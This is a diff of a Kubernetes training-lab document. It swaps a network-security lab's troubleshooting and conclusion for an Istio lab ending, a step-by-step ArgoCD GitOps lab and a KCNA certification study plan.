+    retries:
+      attempts: 3
+      perTryTimeout: 1s
+
+    Apply timeout and retry policy:
+
+kubectl apply -f timeout-retry.yaml
 
 Troubleshooting Tips
 Common Issues and Solutions
 
-Issue: Network policies not taking effect Solution:
+    Pods not showing 2/2 ready status:
+        Check if namespace has istio-injection label
+        Restart pods after enabling injection: kubectl rollout restart deployment/productpage-v1
 
-# Verify CNI plugin supports network policies
-kubectl get nodes -o wide
-kubectl describe node | grep -i cni
+    Cannot access application through gateway:
+        Verify gateway and virtual service configuration
+        Check if LoadBalancer service has external IP assigned
 
-# Check if Calico is properly installed
-kubectl get pods -n kube-system | grep calico
+    mTLS not working:
+        Ensure PeerAuthentication policy is applied correctly
+        Check proxy configuration with istioctl commands
 
-Issue: Falco not detecting events Solution:
-
-# Check Falco pod status
-kubectl get pods -n falco-system
-kubectl logs -n falco-system -l app.kubernetes.io/name=falco
-
-# Verify Falco configuration
-kubectl get configmap -n falco-system
-
-Issue: Attack simulations not working Solution:
-
-# Verify attacker pod has necessary capabilities
-kubectl describe pod attacker-pod -n attacker
-
-# Check network connectivity
-kubectl exec -n attacker attacker-pod -- ping -c 3 8.8.8.8
+    Observability tools not accessible:
+        Verify all add-on pods are running
+        Check port-forward commands are correct
 
 Verification Commands
 
-# Verify all components are running
-kubectl get pods -A | grep -E "(falco|calico|attacker|frontend|backend|database)"
+# Check Istio installation
+istioctl verify-install
 
-# Check network policy status
-kubectl get networkpolicies -A
+# Check proxy status
+istioctl proxy-status
 
-# Verify monitoring is active
-kubectl top pods -A
-kubectl get events --sort-by='.lastTimestamp' | tail -10
+# Analyze configuration
+istioctl analyze
+
+# Check mTLS status
+istioctl authn tls-check <service-name>
+
+Cleanup
+
+To clean up the lab environment:
+
+# Remove sample application
+kubectl delete -f samples/bookinfo/platform/kube/bookinfo.yaml
+kubectl delete -f samples/bookinfo/networking/bookinfo-gateway.yaml
+
+# Remove custom configurations
+kubectl delete -f destination-rule.yaml
+kubectl delete -f reviews-virtual-service.yaml
+kubectl delete -f peer-authentication.yaml
+kubectl delete -f authorization-policy.yaml
+
+# Remove observability add-ons
+kubectl delete -f samples/addons/
+
+# Uninstall Istio
+istioctl uninstall --purge
+kubectl delete namespace istio-system
 
 Conclusion
 
-In this advanced network security lab, you have successfully:
+In this comprehensive lab, you have successfully:
 
-• Implemented comprehensive network policies that restrict traffic flow between different tiers of a Kubernetes application, following the principle of least privilege • Deployed and configured monitoring tools including Falco for runtime security monitoring and tcpdump for network traffic analysis • Simulated realistic attack scenarios including port scanning, lateral movement attempts, and DNS exfiltration to test security controls • Validated policy effectiveness through controlled testing and monitoring of security events
+• Deployed Istio service mesh on a Kubernetes cluster and understood its core components • Configured advanced traffic management including routing, load balancing, and traffic splitting • Implemented mutual TLS (mTLS) for secure service-to-service communication • Applied authorization policies to control access between services • Set up observability tools like Kiali, Prometheus, and Grafana for monitoring • Implemented fault injection and resilience patterns including timeouts and retries
 
-Why This Matters: Network security is critical in containerized environments where applications are distributed across multiple pods and namespaces. The skills you've learned help protect against common attack vectors including:
+Why This Matters: Service mesh technology is crucial for managing complex microservices architectures in production environments. The skills you've learned enable you to:
 
-    Unauthorized lateral movement between application tiers
-    Data exfiltration through network channels
-    Reconnaissance attacks that map internal network topology
-    Privilege escalation through network access
+    Secure communication between services without modifying application code
+    Implement sophisticated traffic management and deployment strategies
+    Gain deep visibility into service behavior and performance
+    Build resilient applications with automatic retry and circuit breaker patterns
 
-Real-World Applications: These techniques are essential for:
-
-    Securing production Kubernetes clusters in enterprise environments
-    Meeting compliance requirements for data protection and network segmentation
-    Implementing zero-trust network architectures
-    Detecting and responding to advanced persistent threats (APTs)
-
-The combination of proactive security policies and comprehensive monitoring provides a robust defense-in-depth strategy that is essential for modern cloud-native security operations. Continue practicing these skills and stay updated with the latest security threats and mitigation techniques to maintain effective network security postures.
+These capabilities are essential for cloud-native applications and are highly valued in the industry, particularly for roles involving Kubernetes, DevOps, and cloud architecture. The knowledge gained in this lab directly supports preparation for the Kubernetes and Cloud Native Associate (KCNA) certification and real-world microservices deployments.
 
 
 
 
+Lab 20: Exploring Cloud Native Application Delivery with GitOps
+Objectives
 
+By the end of this lab, you will be able to:
 
+• Understand the core principles and benefits of GitOps methodology • Install and configure ArgoCD as a GitOps tool in a Kubernetes cluster • Create and structure a Git repository for Kubernetes manifests • Deploy applications using GitOps workflows • Observe automatic synchronization between Git repository changes and cluster state • Update applications through Git commits and monitor the deployment process • Troubleshoot common GitOps deployment issues
+Prerequisites
+
+Before starting this lab, you should have:
+
+• Basic understanding of Kubernetes concepts (pods, services, deployments) • Familiarity with Git version control system • Basic knowledge of YAML syntax • Understanding of container concepts and Docker • Access to command-line interface (CLI) tools
+Lab Environment Setup
+
+Ready-to-Use Cloud Machines: Al Nafi provides Linux-based cloud machines with all necessary tools pre-installed. Simply click Start Lab to begin - no need to build your own VM or install additional software.
+
+Your lab environment includes: • Ubuntu 20.04 LTS with kubectl pre-installed • Minikube for local Kubernetes cluster • Git client configured and ready to use • Text editor (nano/vim) for file editing
+Task 1: Understanding GitOps and Setting Up the Environment
+Subtask 1.1: Start Your Kubernetes Cluster
+
+First, let's start our local Kubernetes cluster using Minikube:
+
+# Start Minikube cluster
+minikube start --driver=docker --memory=4096 --cpus=2
+
+# Verify cluster is running
+kubectl cluster-info
+
+# Check node status
+kubectl get nodes
+
+Subtask 1.2: Create Namespace for ArgoCD
+
+Create a dedicated namespace for ArgoCD installation:
+
+# Create argocd namespace
+kubectl create namespace argocd
+
+# Verify namespace creation
+kubectl get namespaces
+
+Task 2: Installing and Configuring ArgoCD
+Subtask 2.1: Install ArgoCD
+
+Install ArgoCD using the official installation manifests:
+
+# Install ArgoCD
+kubectl apply -n argocd -f https://raw.githubusercontent.com/argoproj/argo-cd/stable/manifests/install.yaml
+
+# Wait for all pods to be ready (this may take 2-3 minutes)
+kubectl wait --for=condition=available --timeout=300s deployment/argocd-server -n argocd
+
+# Check ArgoCD pods status
+kubectl get pods -n argocd
+
+Subtask 2.2: Access ArgoCD UI
+
+Set up port forwarding to access the ArgoCD web interface:
+
+# Port forward ArgoCD server (run this in background)
+kubectl port-forward svc/argocd-server -n argocd 8080:443 &
+
+# Get initial admin password
+kubectl -n argocd get secret argocd-initial-admin-secret -o jsonpath="{.data.password}" | base64 -d && echo
+
+Note: Save the password output - you'll need it to log into ArgoCD UI.
+Subtask 2.3: Install ArgoCD CLI
+
+Install the ArgoCD command-line interface:
+
+# Download ArgoCD CLI
+curl -sSL -o argocd-linux-amd64 https://github.com/argoproj/argo-cd/releases/latest/download/argocd-linux-amd64
+
+# Make it executable and move to PATH
+sudo install -m 555 argocd-linux-amd64 /usr/local/bin/argocd
+
+# Verify installation
+argocd version --client
+
+Subtask 2.4: Login to ArgoCD
+
+Login to ArgoCD using the CLI:
+
+# Login to ArgoCD (use the password from step 2.2)
+argocd login localhost:8080 --username admin --password <your-password> --insecure
+
+# Verify login
+argocd account get-user-info
+
+Task 3: Creating Git Repository for Kubernetes Manifests
+Subtask 3.1: Initialize Local Git Repository
+
+Create a local Git repository to store your Kubernetes manifests:
+
+# Create project directory
+mkdir ~/gitops-demo
+cd ~/gitops-demo
+
+# Initialize Git repository
+git init
+
+# Configure Git user (if not already configured)
+git config user.name "GitOps Student"
+git config user.email "student@example.com"
+
+Subtask 3.2: Create Application Manifests
+
+Create a sample application with Kubernetes manifests:
+
+# Create application directory structure
+mkdir -p apps/sample-app
+
+# Create deployment manifest
+cat > apps/sample-app/deployment.yaml << 'EOF'
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: sample-app
+  labels:
+    app: sample-app
+spec:
+  replicas: 2
+  selector:
+    matchLabels:
+      app: sample-app
+  template:
+    metadata:
+      labels:
+        app: sample-app
+    spec:
+      containers:
+      - name: sample-app
+        image: nginx:1.21
+        ports:
+        - containerPort: 80
+        resources:
+          requests:
+            memory: "64Mi"
+            cpu: "250m"
+          limits:
+            memory: "128Mi"
+            cpu: "500m"
+EOF
+
+# Create service manifest
+cat > apps/sample-app/service.yaml << 'EOF'
+apiVersion: v1
+kind: Service
+metadata:
+  name: sample-app-service
+  labels:
+    app: sample-app
+spec:
+  selector:
+    app: sample-app
+  ports:
+  - protocol: TCP
+    port: 80
+    targetPort: 80
+  type: ClusterIP
+EOF
+
+# Create namespace manifest
+cat > apps/sample-app/namespace.yaml << 'EOF'
+apiVersion: v1
+kind: Namespace
+metadata:
+  name: sample-app
+EOF
+
+Subtask 3.3: Commit Initial Manifests
+
+Commit your manifests to the Git repository:
+
+# Add files to Git
+git add .
+
+# Commit changes
+git commit -m "Initial commit: Add sample application manifests"
+
+# View commit history
+git log --oneline
+
+Task 4: Integrating Git Repository with ArgoCD
+Subtask 4.1: Create ArgoCD Application
+
+Create an ArgoCD application that monitors your Git repository:
+
+# Create ArgoCD application manifest
+cat > argocd-app.yaml << 'EOF'
+apiVersion: argoproj.io/v1alpha1
+kind: Application
+metadata:
+  name: sample-app
+  namespace: argocd
+spec:
+  project: default
+  source:
+    repoURL: file:///home/student/gitops-demo
+    targetRevision: HEAD
+    path: apps/sample-app
+  destination:
+    server: https://kubernetes.default.svc
+    namespace: sample-app
+  syncPolicy:
+    automated:
+      prune: true
+      selfHeal: true
+    syncOptions:
+    - CreateNamespace=true
+EOF
+
+# Apply the ArgoCD application
+kubectl apply -f argocd-app.yaml
+
+Subtask 4.2: Verify Application Creation
+
+Check that your application was created successfully in ArgoCD:
+
+# List ArgoCD applications
+argocd app list
+
+# Get detailed application information
+argocd app get sample-app
+
+# Check application status
+argocd app status sample-app
+
+Task 5: Deploying Applications Through GitOps
+Subtask 5.1: Sync Application
+
+Manually trigger the first synchronization:
+
+# Sync the application
+argocd app sync sample-app
+
+# Wait for sync to complete
+argocd app wait sample-app --timeout 300
+
+Subtask 5.2: Verify Deployment
+
+Verify that your application has been deployed to the cluster:
+
+# Check if namespace was created
+kubectl get namespaces
+
+# Check pods in sample-app namespace
+kubectl get pods -n sample-app
+
+# Check services
+kubectl get services -n sample-app
+
+# Check deployment status
+kubectl get deployments -n sample-app
+
+Subtask 5.3: Test Application Connectivity
+
+Test that your application is running correctly:
+
+# Port forward to test the application
+kubectl port-forward -n sample-app svc/sample-app-service 8081:80 &
+
+# Test the application (in a new terminal or after a few seconds)
+curl http://localhost:8081
+
+# Stop port forwarding
+pkill -f "kubectl port-forward"
+
+Task 6: Updating Applications Through Git Commits
+Subtask 6.1: Modify Application Configuration
+
+Update the application by changing the replica count:
+
+# Navigate to repository directory
+cd ~/gitops-demo
+
+# Update deployment to use 3 replicas
+sed -i 's/replicas: 2/replicas: 3/' apps/sample-app/deployment.yaml
+
+# Verify the change
+grep "replicas:" apps/sample-app/deployment.yaml
+
+Subtask 6.2: Update Container Image
+
+Update the nginx image version:
+
+# Update nginx image version
+sed -i 's/nginx:1.21/nginx:1.22/' apps/sample-app/deployment.yaml
+
+# Verify the change
+grep "image:" apps/sample-app/deployment.yaml
+
+Subtask 6.3: Commit Changes
+
+Commit your changes to trigger GitOps synchronization:
+
+# Add changes to Git
+git add apps/sample-app/deployment.yaml
+
+# Commit changes
+git commit -m "Update: Increase replicas to 3 and upgrade nginx to 1.22"
+
+# View commit history
+git log --oneline -n 3
+
+Task 7: Observing Synchronization Process
+Subtask 7.1: Monitor ArgoCD Synchronization
+
+Watch ArgoCD automatically detect and sync the changes:
+
+# Check application status
+argocd app get sample-app
+
+# Watch the sync process (press Ctrl+C to stop)
+watch -n 2 'argocd app get sample-app | grep -E "(Health|Sync)"'
+
+Subtask 7.2: Verify Changes in Cluster
+
+Confirm that changes have been applied to the cluster:
+
+# Check if replicas increased to 3
+kubectl get pods -n sample-app
+
+# Check deployment details
+kubectl describe deployment sample-app -n sample-app | grep -E "(Replicas|Image)"
+
+# Verify image version
+kubectl get deployment sample-app -n sample-app -o jsonpath='{.spec.template.spec.containers[0].image}'
+echo
+
+Subtask 7.3: View Synchronization History
+
+Check the synchronization history in ArgoCD:
+
+# View application history
+argocd app history sample-app
+
+# Get detailed sync information
+argocd app get sample-app --show-operation
+
+Task 8: Advanced GitOps Operations
+Subtask 8.1: Add ConfigMap to Application
+
+Create a ConfigMap for application configuration:
+
+# Create ConfigMap manifest
+cat > apps/sample-app/configmap.yaml << 'EOF'
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: sample-app-config
+  namespace: sample-app
+data:
+  app.properties: |
+    environment=production
+    debug=false
+    max_connections=100
+  index.html: |
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>GitOps Demo App</title>
+    </head>
+    <body>
+        <h1>Welcome to GitOps Demo!</h1>
+        <p>This application was deployed using GitOps with ArgoCD.</p>
+        <p>Version: 2.0</p>
+    </body>
+    </html>
+EOF
+
+Subtask 8.2: Update Deployment to Use ConfigMap
+
+Modify the deployment to mount the ConfigMap:
+
+# Update deployment to include ConfigMap volume
+cat > apps/sample-app/deployment.yaml << 'EOF'
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: sample-app
+  labels:
+    app: sample-app
+spec:
+  replicas: 3
+  selector:
+    matchLabels:
+      app: sample-app
+  template:
+    metadata:
+      labels:
+        app: sample-app
+    spec:
+      containers:
+      - name: sample-app
+        image: nginx:1.22
+        ports:
+        - containerPort: 80
+        resources:
+          requests:
+            memory: "64Mi"
+            cpu: "250m"
+          limits:
+            memory: "128Mi"
+            cpu: "500m"
+        volumeMounts:
+        - name: config-volume
+          mountPath: /usr/share/nginx/html/index.html
+          subPath: index.html
+      volumes:
+      - name: config-volume
+        configMap:
+          name: sample-app-config
+EOF
+
+Subtask 8.3: Commit and Observe Changes
+
+Commit the new changes and observe the synchronization:
+
+# Add all changes
+git add .
+
+# Commit changes
+git commit -m "Add ConfigMap and update deployment to use custom index.html"
+
+# Monitor the sync process
+argocd app sync sample-app
+
+# Wait for sync completion
+argocd app wait sample-app
+
+Subtask 8.4: Test Updated Application
+
+Test the updated application with custom content:
+
+# Port forward to test updated application
+kubectl port-forward -n sample-app svc/sample-app-service 8082:80 &
+
+# Test the updated application
+curl http://localhost:8082
+
+# Clean up port forwarding
+pkill -f "kubectl port-forward"
+
+Task 9: Troubleshooting GitOps Deployments
+Subtask 9.1: Simulate a Deployment Issue
+
+Create a problematic manifest to see how ArgoCD handles errors:
+
+# Create a deployment with invalid image
+cat > apps/sample-app/broken-deployment.yaml << 'EOF'
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: broken-app
+  labels:
+    app: broken-app
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: broken-app
+  template:
+    metadata:
+      labels:
+        app: broken-app
+    spec:
+      containers:
+      - name: broken-app
+        image: nonexistent-image:latest
+        ports:
+        - containerPort: 80
+EOF
+
+# Commit the problematic manifest
+git add apps/sample-app/broken-deployment.yaml
+git commit -m "Add broken deployment for troubleshooting demo"
+
+Subtask 9.2: Observe Error Handling
+
+Watch how ArgoCD handles the deployment error:
+
+# Check application status
+argocd app get sample-app
+
+# View detailed error information
+kubectl get events -n sample-app --sort-by='.lastTimestamp'
+
+# Check pod status
+kubectl get pods -n sample-app
+
+Subtask 9.3: Fix the Issue
+
+Remove the problematic manifest and restore normal operation:
+
+# Remove the broken deployment file
+rm apps/sample-app/broken-deployment.yaml
+
+# Commit the fix
+git add -A
+git commit -m "Remove broken deployment manifest"
+
+# Sync the application
+argocd app sync sample-app
+
+Task 10: Monitoring and Observability
+Subtask 10.1: View Application Metrics
+
+Check ArgoCD's built-in monitoring capabilities:
+
+# Get application resource usage
+kubectl top pods -n sample-app
+
+# View application logs
+kubectl logs -n sample-app -l app=sample-app --tail=20
+
+# Check application health
+argocd app get sample-app --show-params
+
+Subtask 10.2: Set Up Application Health Checks
+
+Add health check configuration to your application:
+
+# Update deployment with health checks
+cat > apps/sample-app/deployment.yaml << 'EOF'
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: sample-app
+  labels:
+    app: sample-app
+spec:
+  replicas: 3
+  selector:
+    matchLabels:
+      app: sample-app
+  template:
+    metadata:
+      labels:
+        app: sample-app
+    spec:
+      containers:
+      - name: sample-app
+        image: nginx:1.22
+        ports:
+        - containerPort: 80
+        resources:
+          requests:
+            memory: "64Mi"
+            cpu: "250m"
+          limits:
+            memory: "128Mi"
+            cpu: "500m"
+        livenessProbe:
+          httpGet:
+            path: /
+            port: 80
+          initialDelaySeconds: 30
+          periodSeconds: 10
+        readinessProbe:
+          httpGet:
+            path: /
+            port: 80
+          initialDelaySeconds: 5
+          periodSeconds: 5
+        volumeMounts:
+        - name: config-volume
+          mountPath: /usr/share/nginx/html/index.html
+          subPath: index.html
+      volumes:
+      - name: config-volume
+        configMap:
+          name: sample-app-config
+EOF
+
+# Commit health check updates
+git add apps/sample-app/deployment.yaml
+git commit -m "Add liveness and readiness probes to deployment"
+
+Cleanup
+Clean Up Resources
+
+Remove all resources created during the lab:
+
+# Delete ArgoCD application
+argocd app delete sample-app --cascade
+
+# Delete sample-app namespace
+kubectl delete namespace sample-app
+
+# Delete ArgoCD namespace (optional)
+kubectl delete namespace argocd
+
+# Stop Minikube
+minikube stop
+
+Troubleshooting Common Issues
+Issue 1: ArgoCD Pods Not Starting
+
+Problem: ArgoCD pods remain in Pending or CrashLoopBackOff state.
+
+Solution:
+
+# Check pod events
+kubectl describe pods -n argocd
+
+# Ensure sufficient resources
+minikube config set memory 4096
+minikube config set cpus 2
+minikube delete && minikube start
+
+Issue 2: Application Not Syncing
+
+Problem: ArgoCD application shows "OutOfSync" status but doesn't sync automatically.
+
+Solution:
+
+# Check application configuration
+argocd app get sample-app
+
+# Manual sync
+argocd app sync sample-app --force
+
+# Check sync policy
+kubectl get application sample-app -n argocd -o yaml
+
+Issue 3: Git Repository Access Issues
+
+Problem: ArgoCD cannot access the local Git repository.
+
+Solution:
+
+# Ensure correct repository path
+pwd
+ls -la ~/gitops-demo
+
+# Check ArgoCD application source configuration
+argocd app get sample-app | grep -A 5 "Source:"
+
+Conclusion
+
+Congratulations! You have successfully completed the GitOps lab using ArgoCD. Here's what you accomplished:
+
+Key Achievements: • Installed and configured ArgoCD as a GitOps tool in your Kubernetes cluster • Created a structured Git repository with Kubernetes manifests for application deployment • Implemented GitOps workflows that automatically sync cluster state with Git repository changes • Deployed and updated applications through Git commits, observing the complete synchronization process • Learned troubleshooting techniques for common GitOps deployment issues • Implemented monitoring and health checks for cloud-native applications
+
+Why This Matters: GitOps represents a paradigm shift in how we deploy and manage cloud-native applications. By treating Git as the single source of truth for your infrastructure and applications, you achieve:
+
+• Improved Security: All changes go through Git's audit trail and review process • Better Reliability: Declarative configurations ensure consistent deployments • Enhanced Collaboration: Teams can collaborate using familiar Git workflows • Faster Recovery: Easy rollbacks through Git history • Compliance: Complete audit trail of all infrastructure changes
+
+Real-World Applications: The skills you've learned are directly applicable to: • Enterprise DevOps pipelines using tools like ArgoCD, Flux, or Jenkins X • Multi-environment deployments (development, staging, production) • Microservices architectures with independent service deployments • Infrastructure as Code practices with Kubernetes • Continuous deployment in cloud-native environments
+
+This lab has prepared you for the Kubernetes and Cloud Native Associate (KCNA) certification by providing hands-on experience with GitOps principles and practices that are essential in modern cloud-native development workflows.
 
 
 
@@ -13682,18 +11220,43 @@ The combination of proactive security policies and comprehensive monitoring prov
 
 ---
 
-## 🎓 CKS Exam Domains
+## 🎓 Learning Path & Tips
 
-| Domain | Weight |
-|--------|--------|
-| Cluster Setup | 10% |
-| Cluster Hardening | 15% |
-| System Hardening | 15% |
-| Microservice Vulnerabilities | 20% |
-| Supply Chain Security | 20% |
-| Monitoring & Runtime Security | 20% |
+### Study Schedule
+- **Week 1:** Labs 1-5 (Foundations)
+- **Week 2:** Labs 6-10 (Core Concepts)
+- **Week 3:** Labs 11-15 (Advanced Topics)
+- **Week 4:** Labs 16-20 (Production Skills)
+
+### Exam Preparation Tips
+1. ✅ Practice all kubectl commands without looking
+2. ✅ Understand Kubernetes architecture thoroughly
+3. ✅ Review CNCF landscape and cloud-native concepts
+4. ✅ Take practice exams
+5. ✅ Join Kubernetes community forums
+6. ✅ Review official documentation regularly
+
+### Key Topics for KCNA
+- Kubernetes architecture and components
+- Container orchestration fundamentals
+- Cloud-native architecture principles
+- Kubernetes API and objects
+- Services and networking
+- Storage and persistence
+- Security basics
+- Observability fundamentals
 
 ---
 
-**Created by:** Saleem Ali | Al-Nafi International College | January 2026
-**Status:** ✅ CKS-Exam-Ready | **Prereq:** Valid CKA Required!
+## 🚀 Next Steps After KCNA
+
+1. **CKA** - Certified Kubernetes Administrator
+2. **CKAD** - Certified Kubernetes Application Developer  
+3. **CKS** - Certified Kubernetes Security Specialist
+
+---
+
+**Created by:** Saleem Ali  
+**Institution:** Al-Nafi International College (AIOps Program)  
+**Date:** January 2026  
+**Status:** ✅ Complete & Production-Ready
